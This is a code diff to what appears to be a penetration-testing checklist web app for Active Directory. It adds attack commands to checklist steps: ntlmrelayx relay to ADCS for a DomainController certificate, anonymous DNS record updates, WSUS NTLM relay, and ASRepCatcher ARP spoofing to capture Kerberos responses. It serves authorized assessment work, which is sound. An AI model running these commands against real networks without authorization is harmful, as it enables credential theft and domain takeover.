                     "text": "Identified /certsrv endpoints reachable over HTTP/HTTPS.",
+                    "commands": [
+                        "nmap -sT -Pn -v -T2 --open -p 80,443 -iL machinenamesfull -oA webport",
+                        "cat webport.nmap | grep -Eo \\\"([0-9]{1,3}\\\\.){3}[0-9]{1,3}\\\" | tee webIPs.txt",
+                        "for i in $(cat webIPs.txt); do echo $i && curl -s http://$i/certsrv/certfnsh.asp | grep 401; done",
+                        "for i in $(cat webIPs.txt); do echo $i && curl -s https://$i/certsrv/certfnsh.asp | grep 401; done",
+                    ],
                 },
                 {
                     "id": "adcs_ntlmrelay",
@@ -1441,6 +1774,10 @@ def build(st: AppState, app) -> APIRouter:
                     "label": "Relay-to-ADCS successful",
                     "title": "ADCS Relay Success",
                     "text": "ntlmrelayx relay to ADCS endpoint succeeded.",
+                    "note": "Running PXE Thief afterwards may trigger that server to connect back to the attack machine.",
+                    "commands": [
+                        "impacket-ntlmrelayx -ts -t http://[adcs IP/FQDN]/certsrv/certfnsh.asp -smb2support -ntlmchallenge 7894234154656702 --adcs --template DomainController",
+                    ],
                 },
                 {
                     "id": "adcs_template_dc",
@@ -1448,6 +1785,7 @@ def build(st: AppState, app) -> APIRouter:
                     "label": "Template abuse path",
                     "title": "ADCS Template Abuse",
                     "text": "Identified viable certificate template for escalation path.",
+                    "note": "Relay with --template DomainController.",
                 },
                 {
                     "id": "dns_anon_update",
@@ -1455,6 +1793,13 @@ def build(st: AppState, app) -> APIRouter:
                     "label": "Anonymous update accepted",
                     "title": "Anonymous DNS Update",
                     "text": "DNS server accepted unauthenticated/non-secure dynamic update.",
+                    "commands": [
+                        "python3 ./adddns.py --domain [domain] --dnsip [ADIDNS Server ip] --hostname [target hostname] --hostip [IP address to modify]",
+                    ],
+                    "sources": [
+                        "https://github.com/almandin/krbjack",
+                        "https://github.com/decoder-it/KrbRelayEx",
+                    ],
                 },
                 {
                     "id": "dns_safe_demo",
@@ -1462,6 +1807,7 @@ def build(st: AppState, app) -> APIRouter:
                     "label": "Non-disruptive proof",
                     "title": "Safe DNS Update Demonstration",
                     "text": "Demonstrated update using controlled/non-destructive record target.",
+                    "note": "To remain non-disruptive, update your provided hostname with its current IP address. Demonstrate on provided systems only.",
                 },
                 {
                     "id": "dns_kerbrelay_path",
@@ -1469,6 +1815,10 @@ def build(st: AppState, app) -> APIRouter:
                     "label": "Kerberos relay implication",
                     "title": "DNS-to-Relay Path",
                     "text": "Confirmed that DNS update weakness can support relay/impersonation chain.",
+                    "note": "Anonymous DNS updates can result in a Kerberos relay.",
+                    "sources": [
+                        "[[Anonymous DNS Updates - Kerbrelay]]",
+                    ],
                 },
                 {
                     "id": "wsus_discover",
@@ -1476,6 +1826,14 @@ def build(st: AppState, app) -> APIRouter:
                     "label": "WSUS service discovered",
                     "title": "WSUS Discovery",
                     "text": "WSUS identified and reachable for unauth reconnaissance.",
+                    "commands": [
+                        "nmap -sSVC -Pn --open -p 8530,8531 -iL [hosts]",
+                        "sudo wsuks -t [target] --WSUS-Server [wsus server]",
+                    ],
+                    "sources": [
+                        "https://trustedsec.com/blog/wsus-is-sus-ntlm-relay-attacks-in-plain-sight",
+                        "https://github.com/NeffIsBack/wsuks",
+                    ],
                 },
                 {
                     "id": "wsus_only_discover",
@@ -1483,6 +1841,12 @@ def build(st: AppState, app) -> APIRouter:
                     "label": "Discovery-only evidence",
                     "title": "WSUS Discovery Evidence",
                     "text": "Captured discovery evidence for follow-on authenticated validation.",
+                    "commands": [
+                        "python3 wsusniff.py -i <interface>",
+                    ],
+                    "sources": [
+                        "https://github.com/Coontzy1/WSUScripts/tree/main",
+                    ],
                 },
                 {
                     "id": "wsus_followup_auth",
@@ -1504,6 +1868,30 @@ def build(st: AppState, app) -> APIRouter:
                     "label": "Exploit",
                     "title": "Web Exploit Path",
                     "text": "Exploit path identified against a web application component.",
+                },
+                {
+                    "id": "catcher_relay",
+                    "parent_id": "asrep_catcher",
+                    "label": "relay mode (target DC)",
+                    "title": "ASRepCatcher Relay Mode",
+                    "text": "Spoof to force AS-REP requests to a target DC and capture the response.",
+                    "commands": [
+                        "sudo timeout 5m ASRepCatcher relay -dc [dc ip] --stop-spoofing",
+                    ],
+                },
+                {
+                    "id": "catcher_listen",
+                    "parent_id": "asrep_catcher",
+                    "label": "listen mode (ARP the GW)",
+                    "title": "ASRepCatcher Listen Mode",
+                    "text": "ARP the gateway and listen for AS-REP traffic.",
+                    "note": "Have tcpdump and ntlmrelayx running alongside — you never know.",
+                    "commands": [
+                        "sudo timeout 5m ASRepCatcher listen --stop-spoofing",
+                    ],
+                    "sources": [
+                        "https://www.thehacker.recipes/ad/movement/credentials/dumping/network-protocols",
+                    ],
                 },
             ],
         }
@@ -1581,17 +1969,42 @@ def build(st: AppState, app) -> APIRouter:
             cur_branch_ids = {str(b.get("id") or "") for b in cur_branches}
 
             added = False
+            howto_fields = ("commands", "sources", "note")
             for n in default.get("nodes", []):
                 k = str(n.get("key") or "")
-                if k and k not in cur_node_keys:
+                if not k:
+                    continue
+                if k not in cur_node_keys:
                     cur_nodes.append(n)
                     added = True
+                    continue
+                cur = next(
+                    (c for c in cur_nodes if str(c.get("key") or "") == k), None
+                )
+                if cur is None:
+                    continue
+                for field in howto_fields:
+                    if field in n and cur.get(field) != n[field]:
+                        cur[field] = n[field]
+                        added = True
 
             for b in default.get("vuln_branches", []):
                 bid = str(b.get("id") or "")
-                if bid and bid not in cur_branch_ids:
+                if not bid:
+                    continue
+                if bid not in cur_branch_ids:
                     cur_branches.append(b)
                     added = True
+                    continue
+                cur = next(
+                    (c for c in cur_branches if str(c.get("id") or "") == bid), None
+                )
+                if cur is None:
+                    continue
+                for field in howto_fields:
+                    if field in b and cur.get(field) != b[field]:
+                        cur[field] = b[field]
+                        added = True
 
             if added:
                 data["nodes"] = cur_nodes
@@ -1660,6 +2073,42 @@ def build(st: AppState, app) -> APIRouter:
         return st.templates.TemplateResponse(
             "checklist.html",
             {"request": request, "map_name": "authenticated", "map_data": map_data},
+        )
+
+    @router.get("/checklist-demo", response_class=HTMLResponse)
+    def checklist_demo_page(request: Request):
+        with st.db() as s:
+            unauth_map = _load_checklist_map(s, "unauthenticated")
+            auth_map = _load_checklist_map(s, "authenticated")
+        for n in unauth_map.get("nodes", []):
+            if str(n.get("key") or "") == "sccm_unauth":
+                n["label"] = "SCCM Unauthenticated Vulnerabilities"
+                n["exploit_text"] = (
+                    "Track SCCM servers and validate unauthenticated vulnerability paths."
+                )
+        for b in unauth_map.get("vuln_branches", []):
+            bid = str(b.get("id") or "")
+            if bid == "null_enum4":
+                b["label"] = "Unauth LDAP sessions"
+                b["title"] = "Unauthenticated LDAP Sessions"
+                b["text"] = (
+                    "Validate anonymous/unauth LDAP session behavior and exposed directory data."
+                )
+            elif bid == "null_smbmap":
+                b["label"] = "SMB null/anon session"
+                b["title"] = "SMB Null/Anonymous Session"
+                b["text"] = (
+                    "Validate SMB null/anonymous session access and reachable share data."
+                )
+        unauth_map["title"] = "Domain Unauth Checklist"
+        auth_map["title"] = "Domain Auth Checklist"
+        return st.templates.TemplateResponse(
+            "checklist_demo.html",
+            {
+                "request": request,
+                "unauth_map": unauth_map,
+                "auth_map": auth_map,
+            },
         )
 
     @router.get("/checklist-attack-path", response_class=HTMLResponse)
